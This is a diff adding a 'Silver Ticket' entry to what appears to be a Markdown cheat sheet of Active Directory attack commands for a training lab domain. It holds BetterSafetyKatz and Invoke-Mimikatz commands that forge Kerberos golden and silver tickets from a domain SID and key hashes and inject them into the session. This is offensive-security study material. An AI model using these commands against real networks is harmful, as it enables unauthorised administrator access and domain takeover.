@@ -270,6 +270,9 @@ C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:d
 Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21- 1874506631-3219952063-538504511 /aes256:e28b3a5c60e087c8489a410a1199235efaf3b9f125972c7a1e7618a7469bfd6a id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
 ```
 ### Silver Ticket
+```powershell
+C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21- 1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:1e16be70054d1c5999aa53994e03e59c /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
+```
 ### OverPass-the-Hash
 #### Rubeus
 ```powershell 
